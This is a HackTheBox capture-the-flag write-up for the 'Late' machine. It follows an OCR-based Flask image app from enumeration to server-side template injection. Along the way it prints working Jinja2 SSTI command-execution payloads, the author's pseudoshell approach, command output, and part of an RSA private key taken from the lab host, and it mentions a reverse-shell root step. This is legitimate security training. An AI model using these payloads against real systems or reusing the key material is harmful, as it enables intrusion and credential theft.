# htb-late
My scripts and write-up for the HackTheBox machine Late, an infuriating but rewarding box once it was cracked

The machine had a port 22 and 80 open, with a website titled ‘Late - Best online image tools’. The page discussed image manipulation, and had a contact page that looked to not do anything..  Opened up the source to scan thru, and found a vhost in a link there, to 'http://images.late.htb'.  Added this to my /etc/hosts with the same IP and started scanning it with gobuster, and went and took a look at it.

This was a different and much simpler site. I was able to upload a jpg or png image, and convert it back into text, a process called OCR.   I tried this process through burp, saw if maybe I could upload different types of files, etc.  Nothing stood out to be too interesting, it only took images/* file types and only seemed to be happy with png or jpg files when I used burp intruder to try a few different file extensions.  It also mentioned at the top of the page that it used Flask, which really helped me find what I was looking for much quicker.  

I figured that the Flask hint at the top of the page was relevant to the box.  I happened to find what the underlying page was using, by searching 'flask image to text github' and it was the 1st or 2nd result or so.  A result called ImageReader by Lucadibello [https://github.com/lucadibello/ImageReader](https://github.com/lucadibello/ImageReader) proved to look nearly exactly the same, with the text changed.  This sure looked like it.  I loaded it up on my box and investigated what the code looked like.  The code on the box had changed a slight bit, but not a lot.  They behaved pretty much the same way, but a results.txt was generated on the box and I didn't seem to have that on the Flask app.  They both were vulnerable to SSTI, as I found by taking some screenshots of a large font in CherryTree for {{7*7}} and {{7*'7'}}, resulting in 49 and 7777777.  However, I didn't waste a ton of time trying to exploit the flask app.

After creating and trying 26 images with varying SSTI payloads, I had not yet figured out command execution. I decided it would be faster for testing to write my own script to create an image with PIL, upload the image with responses, and display the results.  Boy was I wrong there, but whatever haha.  I did spend about 6-10 hours alone on this script (or set of scripts).  I called the first one imguploader.py.  However, it ended up being very tricky to get perfect responses from the images I was uploading, I was never getting 100% accuracy pretty much, so my payloads all failed in the beginning.  I decided I needed to figure out what was the best font to use, so I created a script to 'score' each font on my system, and font size, and then pick the font/size with the highest score.  I also needed to make sure every character needed for the exploit translated properly, and later learned that double characters might not work well either, so made a 2nd alphabet with this in mind for testing...  I decided to write alphabettest.py to do the scoring, and logged this the 2nd time through to make sure and capture some alternatives as I was still having some trouble translating these results into results with the SSTI.  I noticed a lot of times some of the double characters would translate to a single, in the case of the first underscores especially.  I later learned that for whatever reason, putting some junk in front of the template initiatior {{ i.e aaaa{{ would help give better results.

From here, it was finding the underlying an exploit that worked against the templating system, Jinja2 (I believe?), to try to be able to get command execution.  I did some digging on how these exploits worked by googling ‘ssti cheat sheet’ and found 3 pages of interest:

https://blog.nvisium.com/injecting-flask
https://secure-cookie.io/attacks/ssti/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools

I eventually was able to get code injection: 

Tried:	
`aaa{{ cycler.__init__.__globals__.os.popen('id').read() }}`
Response:	
`aaauid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)`

Took the python code I'd used to exploit and parse the response, and scripted a pseudoshell exploit sstiexploit.py.

Root was *much* easier, found a script that runs after 3 bad ssh root logins to email the owner, called ssh-alert.sh.  I added a revshell oneliner to the bottom and forced 3 bad ssh logins to pop the rootshell.


## Raw Notes:

Interesting sidenote: 
2002 Holcombe Boulevard, Houston, TX 77030, USA is a veterans hospital??

Scanned site, found a link to images.late.htb
Found flask app that looks to be the backend for the site: 
https://github.com/lucadibello/ImageReader

Looked at what I could do with the code, nothing obvious standing out.  Checked out flask SSTI etc
Found that it definitely responded to a few SSTI payloads confirming that {{ 7*7 }} and {{ 7*'7' }} result in 49, and 7777777, which looks like Jinja2


## Enumeration

Started with an autorecon and quick verbose nmap while I wait for it.  Notes:

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools

301        7l       13w      194c http://late.htb/assets
200       98l      512w     4909c http://late.htb/assets/css/bootstrap-theme.css
200      230l     1009w     9461c http://late.htb/index.html
200        4l       17w      370c http://late.htb/assets/images/gt_favicon.png
200       82l      522w     4166c http://late.htb/assets/css/main.css
200      204l      517w     6364c http://late.htb/contact.html
200       13l       18w      217c http://late.htb/assets/js/template.js
200        8l       73w     2429c http://late.htb/assets/js/html5shiv.js

|     (1) email: 
|_      + support@late.htb

|     Path: http://late.htb:80/contact.html
|     Form id: 
|_    Form action: ?msg=Message Sent!

## Subdomains:

Took the opportunity to fuzz subdomains here.  Since I installed Parrot OS I really hadn't set this up again.  I was using dnsmasq to do this on kali linux, so wrote up a quick blog post for the hell of it.

Nothing interesting found, images.late.htb found another way..

## 80/Web:

Page gives me a small amount of detail. Looks like a contact form, that might be active, as a popup shows ‘sent’.. The action is literally just the msg though, so maybe not.. Will need to look closer ..

Email address found: support@late.htb

Looked through HTML and found a hyperlink to images.link.htb:
`
<p>With <a href="http://images.late.htb/">late free online photo editor</a>, you can do just that. First, open Late's free online photo editor website. Second, choose one editing feature you need, such as basic adjustments, portrait beauty, or photo effects from the left dashboard. Third, apply the feature, download, and share your final piece. </p>
`
Added to hosts file and wget all this stuff as well, started a feroxbuster here also. 


Uploaded a image of some web source code:

![source code](sourceimage.png "some test source code")

and got it to return a text file (results (1).txt).

Looks like its missing a lot of characters, hmm.  The screenshot was good quality, so not sure why, the ocr plugin may be not very good.

Tried to upload an favicon.ico file and got ‘invalid extension’

Fuzzed for extensions we can use in burp, used a bunch of seclists common-extensions and then added jpeg, jpg, png, img, ico, svg, etc to the list

Only ones that seemed to illicit a different response were png , jpg so far.. Response:

Error occured while processing the image: Unsupported image format/type

Looks like its analyzing the file to tell if its got the correct format.  Easy one will be png as the front of the file looks like <some char>PNG, 
`
┌─[root@parrotLT]─[/h/late/www]
└──╼ #find . | grep png
./late.htb/assets/images/gt_favicon.png
./images.late.htb/static/img/overlays/01.png
./images.late.htb/static/img/overlays/02.png
./images.late.htb/static/img/overlays/03.png
./images.late.htb/static/img/overlays/04.png
./images.late.htb/static/img/overlays/05.png
./images.late.htb/static/img/overlays/06.png
./images.late.htb/static/img/overlays/07.png
./images.late.htb/static/img/overlays/08.png
./images.late.htb/static/img/overlays/09.png
┌─[root@parrotLT]─[/h/late/www]
└──╼ #cat late.htb/assets/images/gt_favicon.png
�PNG
�
IHD��ad�IT      pHYs

                    ��~�tEXtSoftwareAdobe Fireworks CS6輲��IDAT8���;n1���E�NK%J��K�8=͊
%ۤ�A                                                                                  �8
6~�#�Ԛ�6Ͽ�e��y��DUUᤵN��}*�����h���֯6��_[ ��	�����$RJ������e��ȦA]s�^'a�&����y=~L
���C_���0��U�ҷ���P�"~�&��������Gl�v~c�����C�x�~F�[���IEND�B�┌─[root@parrotLT]─[/h/late/www]
└──╼ #cat late.htb/assets/images/gt_favicon.png | xxd
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0010 0000 0010 0806 0000 001f f3ff  ................
00000020: 6100 0000 0473 4249 5408 0808 087c 0864  a....sBIT....|.d
00000030: 8800 0000 0970 4859 7300 000b 1200 000b  .....pHYs.......
00000040: 1201 d2dd 7efc 0000 001c 7445 5874 536f  ....~.....tEXtSo
`
Anyway, so that will be how to fake the header, later, but first i need to know how i can abuse this, I assume it is the way in..

I probably want to be able to put some python code in here somewhere, and get it to execute, I'd have to guess what they are using on the backend for this..

The hint (I think!!) is that ‘it uses flask’ so I can search for this: 

flask convert image to text
flask ocr

Results:
https://github.com/nikssardana/flaskOcr
https://medium.com/@amanzishan.az/building-a-flask-web-application-to-extract-text-from-images-3f761f4880d9
https://towardsdatascience.com/implementing-optical-character-recognition-ocr-using-pytesseract-5f42cf62ddcc
https://www.geeksforgeeks.org/python-convert-image-to-string-and-vice-versa/

Looking at the first one, this is likely to be what they used, the page doesn't look the same, but the options to download are there etc.  Might be it!

Found a CTF exploiting flask ocr app here that could be related:

`https://terryvogelsang.tech/INSHACK2018-ocr/`

Doesn't look like it actually, there is too many different aspects involved here, computation of the ocr'd text etc.

Looking at the medium page on the flask ocr app pytesseract, it looks like the code is easily exploitable to bypass the extension check:

`ALLOWED_EXTENSIONS = ['png', 'jpg', 'jpeg']
def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS`

So, chars after the last . in the filename (rsplit) has to be in allowed extensions.  Not sure if this will be helpful though to have a different filename before this, but I noticed szymex was able to get user in 7m and root the box in 14m or so,  so this must be pretty simple somehow.

Lets install it and take a look at the source if possible..

`git clone https://github.com/nikssardana/flaskOcr.git ; cd flaskOcr
pip install flask pillow tesseract-ocr`

This stuff looks different though than the page I'm looking at;

`         <form class="form" action="/submitImage/" method="POST" enctype="multipart/form-data">
                        <div class='row'>`
vs:
`            <form action="scanner" method=post enctype=multipart/form-data>`
js at the bottom of this one:

`function showImage(event){
    uploadedImage = document.getElementById('ocrImage').files[0];
    console.log(uploadedImage);
    document.getElementById('uploadedImage').src = URL.createObjectURL(event.target.files[0]);
}
`
the late.htb app has stuff like:
`
aria-describedby="inputGroupFileAddon01" accept="image/*">
`
Doesn't look like its the same. Lets ignore..  They might have use library tesseract and a diff flask template..

tried the /media/ folder just in case, and media/sampleImage.jpg  , media/sampleImage.jpg.txt , media/testImage.png , media/testImage.png.txt
nope, none of them. hmm..

Only ferox results with medium wordlist are /scanner:

`500        4l       40w      290c http://images.late.htb/scanner`

<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

Looked around a little more, searched for flask ocr /scanner and ended up finding this, ohhh boy this looks useful, matches our app title graphically kinda:

[https://github.com/lucadibello/ImageReader](https://github.com/lucadibello/ImageReader)

![github app](imageread-vs.png "Lucadibello app")

vs our app:

![htb app](imageread-ours.png "HTB-Late app")


Yup, def looks to be our backend app. Grabbed this:

`git clone https://github.com/lucadibello/ImageReader.git ; cd ImageReader`

:: Exploitation/Flask

Looked at the code looking for a way to abuse it.. This is the main guts of the conversion.  I think there is a way to put an image in that could show us information within the web app at least like the :

`        scanned_text = pytesseract.image_to_string(Image.open(io.BytesIO(image_data)))

        print("Found data:", scanned_text)

        session['data'] = {
            "text": scanned_text,
            "time": str((datetime.datetime.now() - start_time).total_seconds())
        }`

Looked at the templates for anything to abuse, found this interesting:

`{% include "footer.html" %}`

Might be something also as adding : 

`{% include "../main.py" %}`

Tried screenshotting this as flask1.png and uploading. Got an interesting result:

`Error occured while processing the image: unexpected char '"' at 14`

This is super hopeful actually, lets try converting to ' or escaping for python, etc?? Tried:

`{% include '../main.py' %}`

Same thing, hmm: `Error occured while processing the image: unexpected char "'" at 15`

Okay, lets try escaped quotes \" and \'  for flask3.png and flask.png:

`{% include \"../main.py\" %}`

`{% include \'../main.py\' %}`

ocr messed up on 3 it looks like and capitalized Include :
Error occured while processing the image: Encountered unknown tag 'Include'.
ocr messed up on 4 also I think:
Error occured while processing the image: unexpected char '\\' at 14

flask4.png gives a double \\ , argh, its not reading the image so well.  Maybe I can blow up the font a little to make it easier on the OCR, these last 2 are technical errors..

Ctrl-+ makes the font bigger in cherrytree, used this:

![screenshot from cherrytree](flask1a.png "screenshot from cherrytree")

Still got the same response:  Error occured while processing the image: unexpected char '\\' at 14

I might be able to escape these differently to get past this.. But honestly, not sure what main.py will get me except for the encryption key which I don't even see any use of so far, but maybe I could get upload folder etc.  Anyway, skipping this, I may come back to it, but lets see what else is out there, in the flask injection world.

So, we know the app is https://github.com/lucadibello/ImageReader.

Looked at what else we can do with flask apps, flask command injection, LFI, etc :

https://blog.nvisium.com/injecting-flask
https://secure-cookie.io/attacks/ssti/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools

Lets just check this first to make sure we have SSTI saved as flask6.png: 

{{7*7}}

Thats a hit. Results.txt shows:
`<p>49</p>`

Found what looks like it would be a really good template injection scanner at PayloadsAllTheThing:

Recommended tool: Tplmap e.g:
`python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade`

But, python2 is not pre-installed on Parrot OS anymore, so idk if I will be using this, it errors out when installing requirements.txt

Installed python2.7, I guess I could need this down the line for oscp etc, it sucks not to have it
`apt install -y python2.7`

Installed pip2 for python2.7:
`wget -P ~/.local/lib https://bootstrap.pypa.io/pip/2.7/get-pip.py`
`python2.7 ~/.local/lib/get-pip.py --user `

Installed again:  python2.7 -m pip install -r requirements.txt
Worked, created quick bash script in /usr/bin to run it quickly:
`#!/bin/bash
python2.7 /opt/tplmap/tplmap.py $@`

Ran it against our site:

`tplmap.py -u 'http://images.late.htb/?results' --os-shell`

Realized, I don't have a url to scan with this. BUT. It is there for the future, might go into web challs after looking for flask apps to play with now :)

Tried this2from the secure-cookie ssti page:

![secure-cookie ssti](flask1.png "screenshot from secure-cookie ssti")

Gave results:
Error occured while processing the image: 'str object' has no attribute 'class'

Ugh, okay, maybe cause its split in two lines...  Lets try it on my own here:

`{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}`

Yeah, same error as above.  “foo” I guess has no attribute class.. It's not getting parsed.  Maybe foo should be an actual attribute instead of a string?? Idk, this python witchery is above me a lot still.

Lets try some basics I guess.. flask9.png has 3 commands even..

![basic cmds](flask2.png "basic cmds")

Now its getting a bit funky, hmm. Error:

`Error occured while processing the image: expected token 'end of print statement', got 'os'
tried just the middle one in flask10.png; yeah it is causing the error:
Error occured while processing the image: expected token 'end of print statement', got 'os'
Tried just the end one {{ import os }} - same:
Error occured while processing the image: expected token 'end of print statement', got 'os'`

Can try {{ “foo”.uppercase() }}
`<p>FOO
</p>`

At this point, automating this stuff would be nice, or just loading the app here and debugging whats happening on the back end with print statments maybe.. 

Loaded the app.  Started making a quick test page that I can throw an argument in, and show the results of what works.

Changed the executable , did a which tesseract to find:
        pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract'
    
Created a new route: (not sure if this would even work, hadn't tested it, not super familiar with flask)
@app.route('/tester', methods=['GET', 'POST'])
def test():
    if request.method == 'POST':
        res=request.form["t"]
        return render_template("test.html", title="test", text=res)

This would maybe allow me to do something like  curl ‘http://127.0.0.1:8000/tester?t={{ import os; os.system("ls") }}’

Copied result.html to test.html, then I noticed something that made me realize where I was wrong about the above tests:

        <h2>Extracted text</h2>
        <p>{{ text }}</p>

Hmm, the template already has {{ }} so I need the stuff inside it only maybe?
So maybe, just this would work:  
import os; os.system("ls")  

Tried this as flask13.jpg on the site, got just the raw text..
<p>import os; os.system("Is")
</p> 

Tried the /tester page I added. Tried /tester/?t=hi

this gave a huge error msg:

![Type error](flask3-typeerror.png "Type error")

So, fixed this, I forgot to put in code for the get method, and make it work. Modified to this:

@app.route('/tester', methods=['GET', 'POST'])
def test():
    if request.method == 'POST':
        res=request.form["t"]
        print(res)
        return render_template("test.html", title="test", text=res)
    if request.method == 'GET':
        res=request.args.get("t")
        print(res)
        return render_template("test.html", title="test", text=res)

Tried again the above, and got:

![Extracted](flask4-extracted.png "Extracted")

Cool, getting somewhere now.. Lets try to do the SSTI..

http://127.0.0.1:5000/tester?7*7
Returns: None
http://127.0.0.1:5000/tester?t={{7*7}}
Returns: {{7*7}}
weird, no ssti. okay. I'm thinking its the way the raw data is displayed back into the /result template that is actually doing the injection.

Maybe I can hit /result from the vuln page and trigger it? It appears they removed /result from the routes, otherwise it just returns:
The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.

This should be my ssti though.. tried once more to see if I can get the colors to be better for the screenshot with monospace in Cherrytree:
flask14.png
`                                                                                                                  
  {{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}} 
.                                                                                                                  

Tried to see what its getting before sending the results, looks like its getting a 1 for the l in ls, and there are some spaces messing up the formatting =[ :

{{ "foo". class base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("1s").read()}}

Opened up libreoffice to try to use a system or tahoma font which may be better for tesseract,.

This doesn't look much better, but worth a try I guess:

![Template 1](flask5-template1.png "Template1")

Turned off spell check in Languages -> Writing Aids -> Options -> Check spelling as you type
Then tried again. flask15.png :

![Template 2](flask6-template2.png "Template2")

Ok, it returned what looks like a good string, but the l is still messed up..
{{ "foo". _class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("1s").read()}} 

Maybe I can just use a different command like pwd for now..
{{ "foo". _class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("pwd").read()}} 

![Template 3](flask7-template3.png "Template3")

Tried on the main page, still getting : 
Error occured while processing the image: 'str object' has no attribute '_class_'

Oops,missed a _ turned into a space ‘ ’ above, tried again with:
{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("pwd").read()}}

Alright, I got all the way to __globals__ now..
Error occured while processing the image: 'wrapper_descriptor object' has no attribute '__globals__'

Tried it on my side:
{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("pwd").read()}} 

I wonder if 182 is still correct for this , depending on python versions, libs etc?? Not sure..

Okay, this is getting into the >4 hr mark, I came full circle on this.  should be super easy. But, something is not compatible with this route, to do my  SSTI, I need to figure out how I can test the actual SSTI quickly instead of recreating it

Found a way to create images automatically for testing the local page quickly:

from PIL import Image, ImageDraw, ImageFont
import os
 
# name of the file to save
filename = "img01.png"
fnt = ImageFont.truetype('arial.ttf', 15)
# create new image
image = Image.new(mode = "RGB", size = (200,70), color = "red")
draw = ImageDraw.Draw(image)
draw.text((10,10), "My Text", font=fnt, fill=(255,255,0))
image.save(filename)
 
Refactored this to take ssti lines from a file /w/ssti.txt , create the ong, and send it to the flask app url..

Finally talked to someone as i was not sure where to go with the SSTI anyway, and he mentinoed to just google ssti cheat cheet
Found this awesome page, just what I was looking for:

https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti

Kept working on my script as I will need this first anyway to try a lot of things ( I assume!!)

:: OCR Uploader Script - imguploader.py

Got my script working, it is making a big 1200 x 90 image that is red, with a yellow small font on it so plenty of room for long strings it looks like..  Got input added as well. Draft:
`
from PIL import Image, ImageDraw, ImageFont
import os
import requests

# name of the file to save
ext=".png"
num=0
fnt = ImageFont.truetype('VeraMono.ttf', 15)
url = "http://images.late.htb/scanner"

def send(fname):
    print("[.] sending file "+fname+" to "+url+" ..",)
    file = {'file': open(fname, 'rb')}
    r=requests.post(url, files=file)
    print(r.status_code)
    print(r.text)

with open('/w/ssti.txt') as tfile:
    for txt in tfile:
        # create new image for each ssti attempt
        image = Image.new(mode = "RGB", size = (1200,70), color = "black")
        draw = ImageDraw.Draw(image)
        draw.text((10,10), txt, font=fnt, fill=(255,255,0))
        filename = "i"+str(num)+ext
        image.save(filename)
        send(filename)
        num+=1`

But... Not replying correctly.  Noticed the font is missing chars though, in 7 * 7 it output 7    7

Found some fonts in /usr and cp them to my folder to try out:
`
-rw-r--r-- 1 root root 340240 May  7 14:35 DejaVuSansMono.ttf
-rw-r--r-- 1 root root 361228 May  7 14:35 FreeMono.ttf
-rw-r--r-- 1 root root 316264 May  7 14:35 LiberationMono-Regular.ttf
-rw-r--r-- 1 root root 107848 May  7 14:35 NotoMono-Regular.ttf
-rw-r--r-- 1 root root 510612 May  7 14:35 NotoSansMono-Regular.ttf
-rw-r--r-- 1 root root  49224 May  7 14:35 VeraMono.ttf
`
Created an alphabet in /w/alphabet.txt first to see which font has all characters and ‘replays’ them correctly

Started searching on the best fonts to use for tesseract and ended up with these, but the best results I got were 80% only on consolai.ttf pt12 .. That is not good enough as there are still characters that are not being translated properly.
consolab.ttf  consolai.ttf  Consolas.ttf  consola.ttf  consolaz.ttf  inconsolata.ttf

Tesseract is not accurate for all of these ever it seems like, Ended up spending 5+ hours on creating a whole testing system for the tesseract training data to see what font they used, because its absolutely crap on lots of fonts and sizes!!

So, let this run on EVERY TTF FONT I have on my system, size 10-28 lol... On the actual site with the training data. Let this run for a long time

:: alphabettest.py

My alphabettest.py used their site to show the best font I could find on my system for use with tesseract..

Winning font/size:
`  98 DejaVuSerifCondensed.ttf 23 pts
[o] Saved 1731 png images
`
Modified my script to use this., it was 98 % accurate, but when using with the actual ssti, it is not working correctly AGAIN .Instead, it is 73% when tested with the alphabet again..

So, ran my script again and sent all output to a log file, then searched for the highest percentages to test them out again..

I am not sure what the conditions might be for change, but maybe I can even put fonts and font sizes together , if I had to. Don't want to do that, especially now knowing someone used a serif font in gedit and copy pasted until he got the foothold. But, the large investment fallacy has got me by the toe.. =\
`
Trying font file DejaVuSansCondensed-BoldOblique.ttf size: 26
Tried:  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`0123456789~!@#$%^&*()_+[]\{}|;':",./<>?
200 96% abcdefghijkimnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789~!@#$%~&*()_+[]\{}|j':",./<>?

Trying font file DejaVuSansCondensed-BoldOblique.ttf size: 25
Tried:  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`0123456789~!@#$%^&*()_+[]\{}|;':",./<>?
200 97% abcdefghijklmnopqrstuvwxyZABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789~!@#$%*&*()_+[]\{}|;':",./<>?

Trying font file Lato-BoldItalic.ttf size: 28
Tried:  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`0123456789~!@#$%^&*()_+[]\{}|;':",./<>?
200 97% abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789~!@#$%*&*()_+[]\G}|;':",./<>?

Trying font file DejaVuSerifCondensed.ttf size: 16
Tried:  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`0123456789~!@#$%^&*()_+[]\{}|;':",./<>?
200 97% abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789~!@#$%~&*()_+[]\{}|;':",-/<>?

Trying font file DejaVuSansCondensed-Bold.ttf size: 24
Tried:  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`0123456789~!@#$%^&*()_+[]\{}|;':",./<>?
200 97% abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789~!@#$%*&*()_+[]\{}|:':",./<>?

Trying font file DejaVuSerifCondensed.ttf size: 23
Tried:  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`0123456789~!@#$%^&*()_+[]\{}|;':",./<>?
200 98% abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789~!@#$%*&*()_+[]\{}|;':",./<>?

Trying font file DejaVuSerifCondensed-Bold.ttf size: 24
Tried:  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`0123456789~!@#$%^&*()_+[]\{}|;':",./<>?
200 98% abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789~!@#$%*&*()_+[]\{}|;':",./<>?
`

Okay, tested with the imguploader script and my other 98% is giving me 96% now:
Alphabettest.py:
`98% Trying font file DejaVuSerifCondensed-Bold.ttf size: 24`
Imguploader.py:
`Err Score String
Tried:  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`0123456789~!@#$%^&*()_+[]\{}|;':",./<>?
200 96% abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789~!@#$%*&*()_+[]\{}|;':",./<>?
`
so with this backtick and caret doesn't work, but i think I can make this work if its consistent.  Ran it about 10 more times and got 96% each time. Same chars each time!! Looks good.  Now to continue the ssti..  Found it didn't work at all.  Looks like I am having problems with two underscores in a row.

:: halp

So, I spent way too long on my tests to .   And had to ask someone what font to use?? sans serif in gedit worked for another person.. Thanks for listening to my madness ARZ

Okay, back to the actual exploit, fml.  Tried a couple thing I had open still on the ssti cheat sheet page:

![more tries](halp1.png "more tries")

Error occured while processing the image: 'list object' has no attribute 'class'

![further tries](halp2.png "further tries")

Error occured while processing the image: 'str object' has no attribute 'class'

Looks like this is missing the __ __ around it, not sure why you wouldn't need it, 

This was the tip I got from Romain earlier to start looking for a path:

{{''.__class__.__mro__[1].__subclasses__()}}

holy shit.  Wow.  In sans serif, in gedit, This screenshot actually gets me a list:

`
0 [<class 'type'>
1 <class 'weakref'>
2 <class 'weakcallableproxy'>
3 <class 'weakproxy'>
4 <class 'int'>
5 <class 'bytearray'>
[..]
563 <class 'PIL.PngImagePlugin.ChunkStream'>
564 <class 'PIL.PngImagePlugin.PngInfo'>
565 <class 'PIL.PngImagePlugin._idat'>
566 <class 'PIL.PngImagePlugin._fdat'>
567 <class 'ImagingDecoder'>
568 <class 'ImagingEncoder'>]
`

Looks like 156 is the warning class I was trying to find earlier. So, putting this back in the FIRST ssti I found this morning:

<p>) _[1].__subclasses_()[156].__init__.__globals__['sys'].modules['os'].popen("pwd") .read()}}

failed.  Tried again with a bigger box on the ss:


okay, instead list subclasses here???


still giving me fucking errors:
Error occured while processing the image: unexpected ')'

At this point I have to walk away.  I've been messing with this app for about 8 hours in a row and working on the box for about 10 hours and I am frustrated beyond belief.  Szymex owned this in 7 mins!??!?!  I'm more than 60 times slower than him..


:: romain hint 2

OMG - finally got the hint that solved this mystery for me

Romain mentioned, if you add a little text before the (separator? Idk, the {{ }})) in a template, like aaa {{ test }} this actually makes the image work better for whatever reason

Tried it and holy crap, yes this is so much more accurate..  It works!!! Now I can ssti in peace. fml but that worked well.  idk how szymex figured this out in 7m..  probably something a lot of experienced people know, but I haven't experienced before.  You don't know what you don't know, until you know it ;>

I was able to put together a nice ssti.txt with a lot of stuff frmo the PayloadsAllTheThings jinja2 cheat sheet.. and figured out how to get to command execution super quickly.

:: sstiexploit.py

So, started with this for cmd execution and decided to make my script take input and create a cmd shell out of it.  Some translation will be a problem, will have to escape quotes and doublequotes with \ but should be okay I think in this situation..
`
aaa{{ joiner.__init__.__globals__.os.popen('id').read() }}

Decided to just .replace("!CMD!",mycmd) , making my new string:

aaa{{ joiner.__init__.__globals__.os.popen('!CMD!').read() }}

About an hour or so into it and man, I am rolling, full cmdshell - sstiexploit.py . HOLY CRAP THIS MAKES ME HAPPY !!

└──╼ #pico sstiexploit.py ; python3 sstiexploit.py



sstiexploit.py - crypticsilence 2022-05-08



Err Score String
CMD (or 'exit')> ls
Tried:	aaaaaa{{ joiner.__init__.__globals__.os.popen('ls').read() }}
aaaaaamain.py
main.pyc
misc
__pycache__
static
templates
uploads
wsgi.py


CMD (or 'exit')> ls -lsaF
Tried:	aaaaaa{{ joiner.__init__.__globals__.os.popen('ls -lsaF').read() }}
aaaaaatotal 40
4 drwxrwxr-x 7 svc_acc svc_acc 4096 May  8 10:30 ./
4 drwxr-xr-x 7 svc_acc svc_acc 4096 May  8 00:56 ../
4 -rw-r--r-- 1 svc_acc svc_acc 1765 Apr  4 12:58 main.py
4 -rw-r--r-- 1 svc_acc svc_acc 2192 May  7 21:42 main.pyc
4 drwxr-xr-x 2 svc_acc svc_acc 4096 May  8 15:10 misc/
4 drwxr-xr-x 2 root    root    4096 Apr  4 12:59 __pycache__/
4 drwxr-xr-x 7 svc_acc svc_acc 4096 Jan  6 11:17 static/
4 drwxr-xr-x 2 svc_acc svc_acc 4096 Jan  6 11:17 templates/
4 drwxr-xr-x 2 svc_acc svc_acc 4096 May  8 15:10 uploads/
4 -rw-r--r-- 1 svc_acc svc_acc  104 Apr  4 12:58 wsgi.py


CMD (or 'exit')> ls -lsaF /home
Tried:	aaaaaa{{ joiner.__init__.__globals__.os.popen('ls -lsaF /home').read() }}
aaaaaatotal 12
4 drwxr-xr-x  3 root    root    4096 Jan  5 10:44 ./
4 drwxr-xr-x 23 root    root    4096 Apr  7 13:51 ../
4 drwxr-xr-x  7 svc_acc svc_acc 4096 May  8 00:56 svc_acc/


CMD (or 'exit')> 
`
holy shitsauce thats exciting.  Jumping up and down, showed my kids, etc.  I'm such a loser haha, but, love it.  
Worked out how to get my prepend shell filtered out and cleaned up the code a bit more, wow. Love it.
Figured out how to get Romain some +respect.  I am havnig some problems with my profile, he can't +respect me either atm

:: cmd execution

Tried to figure out how to get a revshell to pop.

quickly just checked ../.ssh/id_rsa, there is a privkey woot
`
CMD (or 'exit')> cat ../.ssh/id_rsa
[ Tried:	tesseractSux {{ joiner.__init__.__globals__.os.popen('cat ../.ssh/id_rsa').read() }}
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
